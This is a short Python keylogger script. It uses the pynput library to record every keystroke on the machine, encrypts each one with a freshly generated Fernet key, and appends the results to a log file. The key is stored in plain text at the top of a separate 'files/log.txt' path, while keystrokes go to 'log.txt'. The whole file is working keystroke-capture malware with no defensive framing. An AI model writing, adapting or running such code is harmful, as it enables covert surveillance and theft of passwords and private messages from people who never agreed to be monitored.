# Imports
from pynput.keyboard import Listener, Key
from cryptography.fernet import Fernet

# Generating key.
key_enc = Fernet.generate_key()

# Save key on the first line of file.
with open(r"files/log.txt", "a", encoding="utf-8") as file:
    file.write(str(key_enc)[2:-1])
    file.write("\n")

# Using generated key to create object.
f = Fernet(key_enc)

# On key press function.
def on_press(key):
    write_in_file(key)

# # Setting bound for testing the code.
# def on_rel(key):
#     if key == Key.esc:
#         return False
    
    
def write_in_file(key):
    # This function writes encrypted data into the log file.
    with open(r"log.txt", "a", encoding="utf-8") as file:
        if key == Key.space:  # Manually adding space.
            key_ = " "
        elif key == Key.backspace:  # Manually adding backspace to indicate.
            key_ = " [Backspace] "
        elif key == Key.tab:
            key_ = "/t"
        elif key == Key.shift_r:  # Manually adding shift stroke.
            key_ = " [shift R] "
        elif key == Key.shift:  # Manually adding shift stroke.
            key_ = " [shift L] "
        else:
            key_ = str(key).replace("'", "")  # Converting to string.
        
        enc_key = f.encrypt(key_.encode("utf-8"))  # Converting from string to bytes and encrypting using encrypt function.
        
        clean_val = str(enc_key)[2:-1]  # Converting to string and removing ambiguities.
        
        file.write(clean_val)
        file.write('\n')  # Adding data on new line.


# Listen to the keys pressed by the user.
with Listener(on_press=on_press) as listener:
    listener.join()


